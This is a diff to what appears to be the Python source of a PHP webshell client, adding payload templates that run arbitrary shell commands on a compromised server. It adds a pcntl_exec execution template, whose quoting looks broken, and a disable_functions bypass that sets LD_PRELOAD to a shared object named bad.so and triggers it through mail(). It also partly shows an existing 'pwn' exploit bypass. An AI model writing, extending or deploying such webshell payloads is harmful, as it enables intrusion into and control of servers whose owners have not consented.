@@ -183,12 +183,15 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
     elif (exec_func == 'popen'):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
+    elif (exec_func == 'pcntl_exec'):
+        SYSTEM_TEMPLATE = """ob_start();pcntl_exec("/bin/bash", array("-c",base64_decode(""%s")));$o=ob_get_contents();ob_end_clean();"""
 
 
 def get_system_code(command: str, print_result: bool = True):
+    bypass_df = gget("webshell.bypass_df", "webshell")
     if (gget("webshell.exec_func", "webshell")):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + ("print($o);" if print_result else "")
-    elif (gget("webshell.bypass_df", "webshell") == 1):
+    elif (bypass_df == 1):
         return """pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
@@ -394,6 +397,15 @@ function pwn($cmd) {
     ob_end_clean();
     %s
 }""" % (base64_encode(command), ("print($o);" if print_result else ""))
+    elif (bypass_df == 2):
+        return """$p="/tmp/%s";
+putenv(base64_decode("%s"));
+putenv("rpath=$p");
+putenv("LD_PRELOAD=./bad.so");
+mail('','','','');
+$o=file_get_contents($p);
+unlink($p);
+%s""" % (str(uuid4()), base64_encode(command), ("print($o);" if print_result else ""))
     else:
         return """print("No system execute function!\\n")"""
 
